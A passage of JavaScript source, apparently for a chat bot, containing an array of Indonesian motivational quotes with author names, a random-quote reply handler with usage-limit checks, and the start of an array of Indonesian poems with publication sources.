      "author": "Mark Cuban",
      "quotes": "Buatlah usaha Anda berhasil dengan satu-satunya cara: kerja keras!."
    },
    {
      "author": "Mark Twain",
      "quotes": "Kebaikan adalah bahasa yang dapat didengar si tuli dan bisa dilihat si buta."
    },
    {
      "author": "Marsha Sinetar",
      "quotes": "Lakukan apa yang Anda senangi, uang akan mengikuti."
    },
    {
      "author": "Martin Luther King",
      "quotes": "Tak ada waktu yang tidak tepat untuk melakukan sesuatu yang benar."
    },
    {
      "author": "Mary McCarthy",
      "quotes": "Kendatipun Anda berada di jalur yang tepat, Anda akan tetap terkejar jika hanya duduk-duduk saja disana."
    },
    {
      "author": "Maxim Gorky",
      "quotes": "Kebahagiaan selalu tampak kecil saat berada dalam genggaman. Tapi coba lepaskan dan Anda akan langsung tahu, betapa besar dan berhargannya kebahagiaan."
    },
    {
      "author": "Mery Hemingway",
      "quotes": "Latih diri Anda untuk tidak khawatir. Kekhawatiran tak pernah memperbaiki apa-apa."
    },
    {
      "author": "Michael Drury",
      "quotes": "Kematangan bukanlah suatu keadaan yang dicapai dengan usia. Dia merupakan perkembangan dari cinta, belajar, membaca dan berpikir hingga menghasilkan kemampuan."
    },
    {
      "author": "Michael Pritchard",
      "quotes": "Anda berhenti tertawa bukan karena bertambah tua. Sebaliknya Anda bertambah tua justru karena berhenti tertawa."
    },
    {
      "author": "Miguel de Cervantes",
      "quotes": "Pepatah adalah kalimat singkat berdasarkan pengalaman panjang."
    },
    {
      "author": "Miguel de Unamuno",
      "quotes": "Tidak dicintai orang lain memang menyedihkan, tapi lebih menyedihkan lagi kalau tidak bisa mencintai orang lain."
    },
    {
      "author": "N. H. Casson",
      "quotes": "Kemiskinan jiwa lebih mengerikan daripada kemiskinan jasmani atau materi."
    },
    {
      "author": "Natalie Portman",
      "quotes": "Anda belum bisa dibilang kaya sampai Anda memiliki sesuatu yang tidak dapat dibeli uang."
    },
    {
      "author": "Nelson Mandela",
      "quotes": "Pendidikan adalah senjata paling ampuh dimana kau dapat menggunakannya untuk merubah dunia."
    },
    {
      "author": "Norman Peale",
      "quotes": "Campakanlah jauh-jauh pikiran murung dan kesal itu, lalu bangkitkanlah."
    },
    {
      "author": "Nunse",
      "quotes": "Bukanlah yang kuat, tetapi yang uletlah yang menjadikan mereka manusia yang besar."
    },
    {
      "author": "O. S. Marden",
      "quotes": "Kemajuan adalah hasil dari memusatkan seluruh kekuatan jiwa dan pikiran pada cita-cita yang dituju."
    },
    {
      "author": "Oliver W. Holmes",
      "quotes": "Semakin lama kita hidup, semakin kita menemukan bahwa kita mirip dengan orang lain."
    },
    {
      "author": "Oprah Winfrey",
      "quotes": "Melakukan yang terbaik pada saat ini akan menempatkan Anda ke tempat terbaik pada saat berikutnya."
    },
    {
      "author": "Oscar Wilde",
      "quotes": "Jika seseorang menyatakan kebenaran, dia yakin; cepat atau lambat; akan mendapatkannya."
    },
    {
      "author": "Pablo Picasso",
      "quotes": "Bila semangat Anda menurun, lakukanlah sesuatu. Kalau Anda telah melakukan sesuatu keadaan tidak berubah, lakukanlah sesuatu yang berbeda."
    },
    {
      "author": "Paul Galvin",
      "quotes": "Jangan takut dengan kesalahan. Kebijaksanaan biasanya lahir dari kesalahan."
    },
    {
      "author": "Paul Harvey",
      "quotes": "Saya tidak pernah melihat suatu monumen didirikan bagi orang pesimis."
    },
    {
      "author": "Pepatah Cina",
      "quotes": "Beranilah menyadari kesalahan dan mulai lagi."
    },
    {
      "author": "Pepatah Cina",
      "quotes": "Benar jadi berani."
    },
    {
      "author": "Pepatah Cina",
      "quotes": "Orang yang bertanya, bodoh dalam 5 menit. Dan orang yang tidak bertanya akan tetap bodoh untuk selamanya."
    },
    {
      "author": "Pepatah Cina",
      "quotes": "Bila saya mendengar, saya akan lupa. Setelah melihat saya bisa mengerti. Dan setelah mengerjakan, barulah saya bisa memahami."
    },
    {
      "author": "Pepatah Cina",
      "quotes": "Orang yang tersenyum selalu lebih kuat dari orang yang marah."
    },
    {
      "author": "Pepatah Cina",
      "quotes": "Orang yang memindahkan gunung memulai dengan memindahkan batu-batu kecil."
    },
    {
      "author": "Pepatah Inggris",
      "quotes": "Orang yang mencari masalah akan selalu mendapatkannya."
    },
    {
      "author": "Pepatah Inggriss",
      "quotes": "Keterampilan dan keyakinan merupakan pasukan bersenjata yang tidak dapat dikalahkan."
    },
    {
      "author": "Pepatah Jepang",
      "quotes": "Sebatang anak panah mudah dipatahkan, tetapi tidak demikian dengan sepuluh anak panah yang disatukan."
    },
    {
      "author": "Pepatah Jepang",
      "quotes": "Visi tanpa aksi adalah mimpi di siang bolong. Aksi tanpa visi adalah mimpi buruk."
    },
    {
      "author": "Pepatah Jerman",
      "quotes": "Orang yang tak pernah mencicipi pahit tak akan tahu apa itu manis."
    },
    {
      "author": "Pepatah Latin",
      "quotes": "Dengan belajar Anda bisa mengajar. Dengan mengajar, Anda belajar."
    },
    {
      "author": "Pepatah Persia",
      "quotes": "Saya menangis karena tak punya sepatu, sampai saya melihat orang tak punya kaki."
    },
    {
      "author": "Pepatah Roma",
      "quotes": "Kesengsaraan menghasilkan ketekunan. Ketekunan menghasilkan watak, dan watak menghasilkan harapan."
    },
    {
      "author": "Pepatah Skotlandia",
      "quotes": "Bila kemauan siap, kaki menjadi ringan."
    },
    {
      "author": "Pepatah Spanyol",
      "quotes": "Mengenal diri sendiri adalah awal dari perbaikan diri."
    },
    {
      "author": "Pepatah Tibet",
      "quotes": "Jangan meremehkan raja yang picik, seperti halnya jangan meremehkan sungai yang kecil."
    },
    {
      "author": "Pepatah Tibet",
      "quotes": "Apabila seseorang mengajarkan sesuatu, dia sendiri harus melaksanakan ajaran itu."
    },
    {
      "author": "Peter Sinclair",
      "quotes": "Kehidupan yang hebat adalah kulminasi dari pemikiran-pemikiran hebat disertai dengan tindakan-tindakan hebat."
    },
    {
      "author": "Phyllis Bottome",
      "quotes": "Ada dua cara mengatasi kesulitan, Anda mengubah kesulitan-kesulitan atau Anda mengubah diri sendiri untuk mengatasinya."
    },
    {
      "author": "Plato",
      "quotes": "Orang bijak berbicara karena mereka mempunyai sesuatu untuk dikatakan, orang bodoh berbicara karena mereka ingin mengatakan sesuatu."
    },
    {
      "author": "Plato",
      "quotes": "Orang bijak berbicara karena ia memiliki sesuatu untuk dikatakan. Orang bodoh berbicara karena ia atau dia harus mengatakan sesuatu."
    },
    {
      "author": "Plato",
      "quotes": "Berbuat tidak adil lebih memalukan daripada menderita ketidakadilan."
    },
    {
      "author": "Plato",
      "quotes": "Siapa yang tidak bisa memimpin dirinya sendiri, tidak akan bisa memimpin orang."
    },
    {
      "author": "Plautus",
      "quotes": "Kesabaran adalah obat terbaik untuk semua masalah."
    },
    {
      "author": "Plautus",
      "quotes": "Jauh lebih mudah memulai secara baik daripada mengakhiri secara baik."
    },
    {
      "author": "Pliny The Elder",
      "quotes": "Harapan adalah tiang yang menyangga dunia."
    },
    {
      "author": "R. A. Kartini",
      "quotes": "Kemenangan gemilang tidak diperoleh dari medan pertempuran saja, tetapi sering diperoleh dari hati."
    },
    {
      "author": "R. Browning",
      "quotes": "kita jatuh untuk bangun, berhenti untuk berjalan, dan tidur untuk bangun."
    },
    {
      "author": "R. W. Shephred",
      "quotes": "Kamu harus menghadapi depresi, sama seperti kamu menghadapi seekor harimau."
    },
    {
      "author": "R.H. Grant",
      "quotes": "Jika Anda mempekerjakan orang-orang yang lebih pintar dari Anda, Anda membuktikan Anda lebih pintar dari mereka."
    },
    {
      "author": "Rabbi Schachtel",
      "quotes": "Kebahagiaan bukanlah memiliki apa yang kita inginkan, melainkan menginginkan apa yang kita miliki."
    },
    {
      "author": "Ralph W. Emerson",
      "quotes": "Satu ons aksi jauh lebih berharga daripada satu ton teori."
    },
    {
      "author": "Ralph W. Emerson",
      "quotes": "Seseorang itu sukses besar jika dia sadar, kegagalan-kegagalannya adalah persiapan untuk kemenangan-kemenangannya."
    },
    {
      "author": "Ralph Waldo Emerson",
      "quotes": "Kedamaian tidak terdapat di dunia luar, melainkan terdapat dalam jiwa manusia itu sendiri."
    },
    {
      "author": "Ralph Waldo Emerson",
      "quotes": "Percayalah kepada orang lain, dan mereka akan tulus kepada Anda. Perlakukan mereka seperti orang besar dan mereka akan memperlihatkan dirinya sebagai orang besar."
    },
    {
      "author": "Rene Descartes",
      "quotes": "Tidak cukup hanya punya otak yang baik. Yang penting adalah menggunakannya secara baik."
    },
    {
      "author": "Richard Bach",
      "quotes": "Tanyakan pada diri sendiri rahasia sukses. Dengarkan jawaban Anda, dan lakukan."
    },
    {
      "author": "Richard C. Miller",
      "quotes": "Jika rumput tetangga lebih hijau, bersyukurlah Anda masih bisa berpijak di tanah untuk melihatnya."
    },
    {
      "author": "Robert Collier",
      "quotes": "Kesempatan Anda untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan Anda pada diri sendiri."
    },
    {
      "author": "Robert F. Kennedy",
      "quotes": "Kemajuan merupakan kata-kata merdu, tetapi perubahanlah penggerakknya dan perubahan mempunyai banyak musuh."
    },
    {
      "author": "Robert Frost",
      "quotes": "Dua jalan dipisahkan pohon, dan saya mengambil jalan yang jarang ditempuh orang. Dan itulah yang membuat perubahan."
    },
    {
      "author": "Robert Frost",
      "quotes": "Alasan mengapa kecemasan membunuh lebih banyak orang dibanding kerja adalah, lebih banyak orang cemas dibanding bekerja."
    },
    {
      "author": "Robert G. Ingersoll",
      "quotes": "Sedikit orang kaya yang memiliki harta. Kebanyakan harta yang memiliki mereka."
    },
    {
      "author": "Robert Half",
      "quotes": "Ketekunan bisa membuat yang tidak mungkin jadi mungkin, membuat kemungkinan jadi kemungkinan besar, dan kemungkinan besar menjadi pasti."
    },
    {
      "author": "Robert S. Lynd",
      "quotes": "Hanya ikan yang bodoh yang bisa dua kali kena pancing dengan umpan yang sama."
    },
    {
      "author": "Robert Von Hartman",
      "quotes": "Ambisi seperti air laut, semakin banyak orang meminumnya semakin orang menjadi haus."
    },
    {
      "author": "Robinsori",
      "quotes": "Cemas dan ketakutan adalah akibat kebodohan dan keraguan."
    },
    {
      "author": "Romand Rolland",
      "quotes": "Pahlawan adalah seseorang yang melakukan apa yang mampu dia lakukan."
    },
    {
      "author": "Roosevelt",
      "quotes": "Jika Anda ingin menjadi orang besar, janganlah suka beromong besar, kerjakanlah hal-hal yang kecil dahulu."
    },
    {
      "author": "Ross Cooper",
      "quotes": "Satu-satunya cara untuk mengubah hidup kita adalah dengan mengubah pikiran kita."
    },
    {
      "author": "Ruth P. Freedman",
      "quotes": "Perubahan terjadi ketika seseorang menjadi dirinya sendiri, bukan ketika ia mencoba menjadi orang lain."
    },
    {
      "author": "Salanter Lipkin",
      "quotes": "Perbaiki diri Anda, tetapi jangan jatuhkan orang lain."
    },
    {
      "author": "Samuel Smiles",
      "quotes": "Cara tercepat untuk menuntaskan banyak hal adalah dengan menyelesaikannya satu demi satu."
    },
    {
      "author": "Satya Sai Baba",
      "quotes": "Dua hal yang harus dilupakan, kebaikan yang telah kita lakukan kepada orang lain dan kesalahan orang lain kepada kita."
    },
    {
      "author": "Scott Fitzgerald",
      "quotes": "Ingatlah, jika Anda menutup mulut sebenarnya Anda telah melakukan pilihan."
    },
    {
      "author": "Seneca",
      "quotes": "Hati manusia tidak akan pernah tenteram sebelum berdamai dengan diri sendiri."
    },
    {
      "author": "Seneca",
      "quotes": "Hidup berarti berjuang. Hidup nikmat tanpa badai topan adalah laksana laut yang mati."
    },
    {
      "author": "Shackespeare",
      "quotes": "Kesedihan hanya bisa ditanggulangi oleh orang yang mengalaminya sendiri."
    },
    {
      "author": "Shirley Briggs",
      "quotes": "Beranikan diri untuk menjadi dirimu sendiri, karena kita bisa melakukan hal itu lebih baik daripada orang lain."
    },
    {
      "author": "Soe Hok Gie",
      "quotes": "Lebih baik diasingkan daripada menyerah kepada kemunafikan."
    },
    {
      "author": "Soemantri Metodipuro",
      "quotes": "Langkah pertama untuk memilih keyakinan pada diri sendiri adalah mengenal diri kita sendiri."
    },
    {
      "author": "Sophocles",
      "quotes": "Bila seseorang kehilangan segala sumber kebahagiaan, dia tidak lagi hidup, tapi mayat yang bernafas."
    },
    {
      "author": "St. Jerome",
      "quotes": "Baik, lebih baik, terbaik. Jangan pernah berhenti sampai baik menjadi lebih baik, dan lebih baik menjadi terbaik."
    },
    {
      "author": "Stephen R. Covey",
      "quotes": "Motivasi adalah api dari dalam. Jika orang lain mencoba menyalakannya untuk Anda, kemungkinan apinya hanya menyala sebentar."
    },
    {
      "author": "Steve Jobs",
      "quotes": "Saya bangga, baik pada hal yang tidak kami lakukan maupun pada hal yang kami lakukan."
    },
    {
      "author": "Sujiwo Tejo",
      "quotes": "Cinta tak perlu pengorbanan. Pada saat kau merasa berkorban, pada saat itu cintamu mulai pudar."
    },
    {
      "author": "Sydney Harris",
      "quotes": "Ancaman nyata sebenarnya bukan pada saat komputer mulai bisa berpikir seperti manusia, tetapi ketika manusia mulai berpikir seperti komputer."
    },
    {
      "author": "Theodore Rosevelt",
      "quotes": "Lakukan apa yang dapat Anda lakukan dengan apa yang Anda miliki dan tempat Anda berada."
    },
    {
      "author": "Thomas Alva Edison",
      "quotes": "Banyak kegagalan dalam ini dikarenakan orang-orang tidak menyadari betapa dekatnya mereka dengan keberhasilan saat mereka menyerah."
    },
    {
      "author": "Thomas Carlyle",
      "quotes": "Pergilah sejauh mungkin yang bisa Anda lihat dan Anda akan bisa melihat lebih jauh."
    },
    {
      "author": "Thomas Fuller",
      "quotes": "Orang yang tidak bisa memaafkan orang lain sama saja dengan orang yang memutuskan jembatan yang harus dilaluinya, karena semua orang perlu dimaafkan."
    },
    {
      "author": "Thomas Fuller",
      "quotes": "Menyaksikan adalah mempercayai, tapi merasakan adalah kebenaran."
    },
    {
      "author": "Thomas Jefferson",
      "quotes": "Dalam hal prinsip, usahakan kukuh seperti batu karang. Dalam hal selera, coba berenang mengikuti arus."
    },
    {
      "author": "Tung Desem Waringin",
      "quotes": "Setiap badai pasti berlalu dan saya akan tumbuh semakin kuat."
    },
    {
      "author": "Tyler Durden",
      "quotes": "Setelah kehilangan segalanya, barulah kita bebas melakukan apa saja."
    },
    {
      "author": "Umar bin Khattab",
      "quotes": "Raihlah ilmu dan untuk meraih ilmu belajarlah untuk tenang dan sabar."
    },
    {
      "author": "Vicosta Efran",
      "quotes": "Hiduplah seperti lilin yang menerangi orang lain. Jangan hidup seperti duri yang mencucuk diri dan menyakiti orang lain."
    },
    {
      "author": "Victor Hugo",
      "quotes": "Kesedihan adalah buah. Tuhan tak pernah membiarkannya tumbuh dicabang yang terlalu lemah untuk menanggungnya."
    },
    {
      "author": "Victor Hugo",
      "quotes": "Kebahagian tertinggi dalam kehidupan adalah kepastian bahwa Anda dicintai apa adanya, atau lebih tepatnya dicintai walaupun Anda seperti diri Anda adanya."
    },
    {
      "author": "Victor Hugo",
      "quotes": "Masalahnya bukan kurangnya tenaga, tetapi kurangnya daya kemauan."
    },
    {
      "author": "Vince Lambardi",
      "quotes": "Kemenangan bukanlah segala-galanya, tetapi perjuangan untuk menang adalah segala-galanya."
    },
    {
      "author": "Virginia Wolf",
      "quotes": "Jika Anda tak bisa mengatakan hal yang benar dari diri Anda, maka Anda pun tak bisa mengatakan hal yang benar dari orang lain."
    },
    {
      "author": "W. Camden",
      "quotes": "Burung yang terbang pagi akan memperoleh cacing paling banyak."
    },
    {
      "author": "Walt Disney",
      "quotes": "Cara untuk memulai adalah berhenti berbicara dan mulai lakukan sesuatu."
    },
    {
      "author": "Walter Cronkite",
      "quotes": "Sukses akan lebih permanen jika Anda meraihnya tanpa menghancurkan prinsip-prinsip Anda."
    },
    {
      "author": "Warren Buffett",
      "quotes": "Dari dulu saya selalu yakin saya akan kaya. Saya kira saya tak pernah meragukannya, satu menit pun."
    },
    {
      "author": "Whitney Young",
      "quotes": "Lebih baik menyiapkan diri untuk sebuah peluang dan tidak mendapatkannya daripada punya peluang dan tidak menyiapkan diri."
    },
    {
      "author": "William A. W.",
      "quotes": "Satu-satunya yang bisa menghalangi kita adalah keyakinan yang salah dan sikap yang negatif."
    },
    {
      "author": "William Allen White",
      "quotes": "Saya tidak takut pada hari esok karena saya sudah melihat hari kemarin dan saya mencintai hari ini."
    },
    {
      "author": "William Arthur",
      "quotes": "Guru yang biasa-biasa, berbicara. Guru yang bagus, menerangkan. Guru yang hebat, mendemonstrasikan. Guru yang agung, memberi inspirasi."
    },
    {
      "author": "William F. Halsey",
      "quotes": "Semua masalah menjadi lebih kecil jika Anda tidak mengelaknya, tapi menghadapinya."
    },
    {
      "author": "William J. Johnston",
      "quotes": "Perubahan yang paling bermakna dalam hidup adalah perubahan sikap. Sikap yang benar akan menghasilkan tindakan yang benar."
    },
    {
      "author": "William James",
      "quotes": "Jika Anda harus membuat pilihan dan Anda tidak melakukannya, itu saja sudah pilihan."
    },
    {
      "author": "William James",
      "quotes": "Percaya bahwa hidup itu berharga, dan kepercayaan Anda akan membantu menciptakan hidup yang berharga."
    },
    {
      "author": "William Ralph Inge",
      "quotes": "Kuatir sama seperti membayar bunga untuk uang yang mungkin tak pernah Anda pinjam."
    },
    {
      "author": "William Shakespeare",
      "quotes": "Jangan sering menyalakan api kebencian terhadap musuhmu, karena nanti akan membakar dirimu sendiri."
    },
    {
      "author": "William Shakespeare",
      "quotes": "Bila kamu jujur kepada dirimu sendiri, bagai siang pasti berganti malam, kamu takkan pernah berdusta kepada orang lain."
    },
    {
      "author": "William Shakespeare",
      "quotes": "Kutu yang berani adalah kutu yang bisa berani mendapatkan sarapannya pada bibir seekor singa."
    },
    {
      "author": "Winston Churchill",
      "quotes": "Kita menyambung hidup dengan apa yang kita peroleh, tapi kita menghadirkan kehidupkan dengan apa yang kita berikan."
    },
    {
      "author": "Wolfgang von Gothe",
      "quotes": "Pengetahuan tidaklah cukup, kita harus mengamalkannya. Niat tidak cukup, kita harus melakukannya."
    },
    {
      "author": "Zachary Scott",
      "quotes": "Ketika Anda bertambah tua, Anda akan menemukan satu-satunya hal yang Anda sesali adalah hal-hal yang tidak Anda lakukan."
    },
    {
      "author": "Zig Zaglar",
      "quotes": "Batu fondasi untuk sukses yang seimbang adalah kejujuran, watak, integritas, iman, cinta dan kesetiaan."
    },
    {
      "author": "Zig Zaglar",
      "quotes": "Kebanyakan orang gagal meraih cita-citanya bukan karena mereka tidak mampu, tetapi karena tidak berkomitmen."
    },
    {
      "author": "Zig Zaglar",
      "quotes": "Kita tidak harus hebat saat memulai, tapi kita harus memulai untuk menjadi hebat."
    }
  ]
const quote = quot[Math.floor(Math.random() * quot.length)]
m.reply(`${quote.quotes}\n\nBy ${quote.author}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'puisi': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const puis = [
        "Luthfi Mardiansyah (l. 1991)\nDi Bawah Senyummu\n\n : untuk Inneke Soraya Amalia\n\n/1/\nDi bawah senyummu\nkrisan merimbun;\nujung lengkung daun,\nembun ngungun.\n\nAngan-angan angin\ntugur di alis awan.\nTurun jadi tandan\nhujan.\n\n/2/\nDi bawah senyummu\nilalang meremang;\nbuhul dibilas bias biru,\nmatari merajah bayang.\n\nLangut langit\ntiras di sungging samun.\nJadi gurat-gurat isyarat\npintalan anyaman awan.\n\n/3/\nDi bawah senyummu\ncahaya berbenah;\nterang hari yang istirah,\ncadik petang dikayuh.\n\nKidung lembayung\nlagu warna marun.\nTalud laut hening,\nlambat-laun.\n\n/4/\nDi bawah senyummu\npurnama purna;\ngaram-garam malam,\nserangga menggumam.\n\nBadik bintang\nseputih bahu bianglala.\nLampus ladam kemukus,\nkayuh kabut yang kikis.\n\n/5/\nDi bawah senyummu\nombak mereda debur;\nikan-ikan membangun\npuri-puri terumbu.\n\nLangkan laut\nanjung kecup mercu.\nDi tepi, langit-darat\nmenghapus batas aras\n\n2012\n\nSumber: Sesaji Senyap (Garudhawaca, Yogyakarta, 2013)\n\n",
        "Irma Agryanti (l. 1986)\nLayang-layang\n\nhanya jika kau datang ke rumah ini\nmereka akan bermunculan\n\ntubuhnya buluh bambu\nbergambar awan, berekor panjang\ndengan sayap bulan agustus\n\ntentu ia akan setinggi siang\nsebab cuma kau yang mahir\nmenggelas temali\nlebih kuat dari jambang nabi\n\nsesekali dibiarkan ia hinggap\nke pohon jambu\ntempat sepasang ari-ari dikubur\npengikat raga paling nujum\n\nkukira kau tak lagi datang\nsejak kita takut menulari wajah masing-masing\nsaling melepas biar\nseperti layang-layang\ndan ingatan pada nama kecilmu\n\n2011\n\nSumber: Requiem Ingatan (Komunitas Akar Pohon, Mataram; 2013)\n\n",
        "Benny Arnas (l. 1983)\nKembang Putih di Atas Perahu\n\nKularung ibu di samudera yang meliuk di taman tanpa tiang\nIa hanya mengembara\ndengan biduk pelepah air mata,\ndengan sauh yang membuat laut berkibar dalam\nbelanga yang berperigi gunung-gunung\n\nIa tidak akan pergi ke mana-mana\nbila kita tak tumbuh dari akar-akar melur\nyang merambat di antara mulut-mulut kecubung;\nkelopak-kelopak rindu adalah saputangan paling halus\nmengalahkan sutra dan telapak kaki bidadari\n\nPercuma mencegahnya membuka pintu karena nasihat\nyang saban malam kita curi adalah katup jantungnya\nyang mengayuh degupan sekencang badai\nyang mengumpar bersama mantera-mantera\n\nMaka, berkhidmatlah dengan sejumlah dosa\nkarena malam akan menyungkup kesedihan\nyang menggunduk di dada yang makin hari makin\nmenyuburkan dua bukit yang sejak dulu memberi kita\nair mata berwarna pejuh;\nkita hisap dan lumat lamat-lamat;\nlalu kau menyeruak dari akar;\naku pun mekar dan melebar;\nmenjadi perahu\n\nKulambaikan tangan pada langit yang berbuih\nKami terlampau malu menjadi benalu\nyang merambat dan menggigit perdu-perdu\nyang kelak menjadi sauh di dalam perut kami\nDan sauh itu, selalu kami berikan kepada\npohon-pohon yang menumbuhkan kembang,\nkembang putih yang kayunya kami tebang\nkami rakit menjadi perahu\n\n(Lubuklinggau, 2011)\n\n\n\nSUMBER: LAMPUNG POST, 2011\n\n\n\n\n\n\n\n\n\n\n\n\n",
        "Dedy Tri Riyadi (l. 1974)\nPotret Diri\n\nDia melukismu sebagai sesuatu yang tak bakal tua. Sebagai langit\nmenyala. Sebagai tenung bagi teruna. Sebagai pohon dengan\ncabang sederhana. Sebagai rimbun dukana. Sebagai sungai dengan\nnafsu ke utara. Sebagai bisu yang bisa berbahagia.\n\nDia mendudukkanmu di tengah sebagai menara. Sebagai kilat\npedang di udara. Sebagai tahun-tahun berburu dan menderita.\nSebagai apel busuk di sudut meja. Sebagai lidah terjulur cendekia.\nSebagai bangsa berwarna tanpa senjata. Sebagai perahu di tepi\ndermaga\n\nDia ingin selalu memnbuatmu memesona. Sebagai sebuah tamasya\nSebagai kelinci di saku celana. Sebagai doa seorang hamba.\nSebagai sembilan ekor koi di muka telaga. Sebagai langkah\ntertahan seorang perwira. Sebagai delapan kuda memercik ujung\nsamudra.\n\nDia membagi senyum dan pandanganmu ke segenap penjuru.\nSebagai hasrat. Sebagai halus ujung kuas mendarat dan menyapu\nberagam warna. Sebagai tanda untuk dirinya — suatu saat. Sebagai\nmukjizat. Sebagai sesuatu yang kerap membuatmu terperanjat dan\nberpura-pura; tak ada sesiapa.\n\n2016\n\nSumber: Kompas, Sabtu, 19 MaretTambah Baru 2016\n\n",
        "Ajip Rosidi (l. 1938)\nPercakapan\n\nAkankah ini suatu permainan\nSedang wajah jadi layu, ayip\n\nMalam terlalu tebal di matamu\nHidup menjanjikan tantangan kepadaku\n\nDekapkan wajahmu ke wajahku\nBiar malam tebal menebal bergelayutan\nDi dinding trem lari kepadaku\n\nAkankah ini cuma permainan\nSedang umur dan wajah runtuh ke bumi\nAyip?\n\nKulihat kota yang agung terkaca di matamu\nKusaksikan kau ada di sana\nSedang kita berangkat tua\n\nSumber: Terkenang Topeng Cirebon (1993)\n\n",
        "Hasta Indriyana (l. 1977)\nKompor\n\nApa kabar kompor?\nIni malam ingin kukenang kau\n\nBagaimana dulu tiap bulan\nMembongkar wadah minyak tanah\nMengulur sumbu dan memotong\nPucuknya yang arang dan ringkih\n\nSetelan sumbu harus licin tak mampat\nOleh karat. Semua bagian dilap mengkilap\nHingga ibu mengulum senyum\n\nTangan ini puluhan tahun sudah\nTak terendam minyak tanah\nItu sebab negara kewalahan mengolah\nMinyak bumi\n\nPada akhirnya kini, aku\nMenuliskanmu juga dalam larik\nPuisi sederhana. Betapa dari ujung\nBenang menyala itu telah\nMengenangkanku pada segala\nMasakan ibu\n\nCimahi, 2013\n\nSumber: Rahasia Dapur Bahagia (Gambang Buku Budaya, Sleman, Yogyakarta; 2017)\n\n",
        "D. Zauhidhie (1934-1984)\nHuma yang Perih\n\ntiada lagi kerbau menguak\ngemertuk roda cikar terengah-engah\nsarat beban memuat padi\nkelapa dan umbi\n\ntiada punggung-punggung dan bahu-bahu menghambin lanjung\npenuh berisi terong jagung atau pisang\nbelimbing sirih pinang\n\nmana keranuman tubuh ramping yang liuk-lampai\ntempaan alam permai\ndengan rambut panjang membeliut terkulai\ntangan halus jeriji lentik\nyang tiap pagi memetik melati\nmeraup kembang kenanga\n\nmana dendang dan lenggokmu yang bersih\nketika pagi senja turun mandi\nbercebur di danau jernih tenang\nkecipak kecibung\n\nke mana perginya orang lumpur\nwajah tanah\nkaki yang kukuh dan tangan tak pernah kering\n\njika ke kota apa kaucari\ndi bawah lampu merah kuning hijau\nsegala menyilau\n\nlebih baik kembali\nkelak engkau akan tersia\nbahagia di sana di peti mati\nterkubur dalam\n\nengkau ke kota atau ke mana sungguh wikana\nhanya di sini betapa perih\ntiada lenggok pohonan disintuh angin\n\nsetiap pengembara yang tersesat ke mari\nmau tak mau mengakui\nsiang malam di sini tanpa pangkal ujung\n\nmau tak mau tunduk tengadah\nmenatap langit menjulur rendah\ndan matahari yang hilang wajah\n\nakan mengurut dada\nketika pipit gelatik terbang ke hulu\nmeninggalkan dahan dan ranting sambil tersedu\n\norang-orang yang tidak tentu arah meninjaulah ke mari\ntempat peminta-minta menggelak ria\nraja dan pendeta meratap sendu\nmulia hina tanpa teraju\nbagai kolam tenang lagi jernih\n\nakankah di sini terbina sebuah istana\ndengan pintu jendela besar-besar dan lampu-lampu berantukan\nbukankah istana di kota yang pernah kulalui\ndahulu belantara tiada taranya\npelinjangan harimau dan pelanduk bercanda\ndan pemburu mati dikoyak-koyak beruang\n\nmenyelusup ke balik lalang berisik\njengkrik kumbang atau capung\nmenyusun sebuah simponi beragam lagu\nuntuk menghibur diri sendiri\nsebisa-bisanya\n\nalangkah merdu dan aku dibikinnya tak mau pulang\n\n\n\nSumber: Tanah Huma (PT. Dunia Pustaka Jaya, Jakarta, 1978)\n\n\n\n\n\n",
        "Dodong Djiwapradja (1928-2009)\nMancing di Kali Cimanuk\n\nSehabis naik bukit ini, pohon loa \nBelok kanan lalu lembah, akhirnya air.\n\nBatu dan pasir begini melulu dari dulu \nDan air terus saja mengalir \nTak peduli sudah berapa kali \nPenduduk sini mati berganti \nAnak-anak masih juga suka bermain \nDi sini, telanjang bulat, berkelahi \nMenggali pasir nyemplung di air \nHanya bukan yang dulu lagi! \nMereka telah lama pergi \nDari kampungnya, mengembara \nEntah kemana \n\nLalu dunia mulai terdiam:\nUjung joran bergerak-gerak! \nSeakan tak ada lagi yang tampak \nSelain joran, tali pancing, nafas sesak \nSerta air riuh bergelucak.\n\nJika dunia hanya begini saja \nAlangkah damainya!\n\nHanyalah takut \nKaki sebawah lutut \nLama akan membantu \nDan berlumut \n\n1972 \n\nSumber: Laut Biru Langit Biru (Pustaka Jaya, 1977) \n\n",
        "D. Zauhidhie (1934-1984)\nKepada Paduka Puisi\n\nKucarikan tiang dan balokan\nPaku dan papan\nWalau untuk itu aku jadi tukang besi\nMenebang pohon di hutan\nKubangun rumahmu\nDi tanah yang luas ini\nKetika aku kepingin mendiami\nAtapmu tiris rumbia\n\nKupandangi dari luar\nEngkau kurang baik hati\nAku jadi benci\nKurubuh kembali\nRumah dengan tiang yang sangsi\nPadahal sekian lama mengetam menggergaji\nSekarang diserang encok dan dada jadi pehong\n\nKepingin kubangun rumahmu yang kukuh\nSerba betonan\nCampuran semen batu kali\nKerangka besi\nBiar lama. Lama. Lama\nPintu jendela serba kaca\nKucat segala warna\nSedap pandangan mata jiwa\nMatahari menjenguk ke dalam kamar\nBulan ikut tidur di ranjangku\n\nBersama kabut malam\nOrang-orang melihat aku\nBersiul-siul murung\nKetawa-ketawa\n\n1975\n\nSumber: Tanah Huma (PT. Dunia Pustaka Jaya, Jakarta, 1978)\n\n",
        "Mawie Ananta Jonie (l.1940)\nAda yang Ingin Kukatakan\n\nMendung dan hujan turun di atas genteng rumah,\nmengetok kaca jendela irama gendang yang resah.\n\nSebuah puisi kubiarkan terbengkalai di layar kaca,\naku mencari tanda tanya untuk koruptor di luar penjara.\n\nAda yang ingin kukatakan dari yang lama kurasakan\ntentang mereka yang menguasai palu keputusan.\n\nKoruptor sudah membagibagi laut dan bumi negeri ini,\nhukum dan pengadilan akankah jadi begini lagi?\n\nMendung pergi dan langit terang\ntidak dengan sendirian pergi dan datang.\n\nAmsterdam, 14 Maret 2008\n\n\nSumber: Cerita untuk Nancy (Ultimus dan Lembaga Sastra Pembebasan, Bandung,\n2008)\n\n",
